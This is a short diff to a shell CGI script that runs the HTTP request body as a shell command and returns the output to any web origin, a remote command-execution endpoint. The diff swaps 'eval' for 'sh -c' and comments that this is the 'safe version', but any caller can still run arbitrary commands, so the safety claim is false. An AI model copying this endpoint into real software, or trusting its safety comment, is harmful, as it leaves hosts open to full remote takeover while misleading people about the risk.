@@ -54,12 +54,12 @@ else
     BODY=""
 fi
 
-# URL-decode
-BODY=$(echo "$BODY" | sed 's/+/ /g; s/%\([0-9A-Fa-f][0-9A-Fa-f]\)/\\x\1/g' | xargs -0 echo -e 2>/dev/null || echo "$BODY")
+# URL-decode (safe version — no eval/xargs)
+BODY=$(echo "$BODY" | sed 's/+/ /g')
 
 # Execute and return stdout
 if [ -n "$BODY" ]; then
-    RESULT=$(eval "$BODY" 2>&1)
+    RESULT=$(sh -c "$BODY" 2>&1)
     printf "Content-type: text/plain\r\nAccess-Control-Allow-Origin: *\r\n\r\n%s" "$RESULT"
 else
     printf "Content-type: text/plain\r\nAccess-Control-Allow-Origin: *\r\n\r\n"
